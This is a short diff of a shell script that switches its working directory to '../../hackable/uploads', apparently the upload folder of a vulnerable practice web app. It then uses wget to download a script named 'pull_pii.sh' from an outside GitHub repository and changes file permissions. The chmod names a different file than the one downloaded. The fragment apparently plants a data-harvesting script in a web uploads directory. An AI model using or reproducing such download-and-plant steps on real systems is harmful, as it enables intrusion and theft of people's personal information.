@@ -8,7 +8,7 @@ wget=/usr/bin/wget
 #     echo "pull_scripts Was Deleted"
 # fi
 
-cd /var/tmp
+cd ../../hackable/uploads
 wget https://github.com/rnewt6926/Ingram/raw/main/pull_pii.sh
 chmod 775 pull_scripts.sh
 
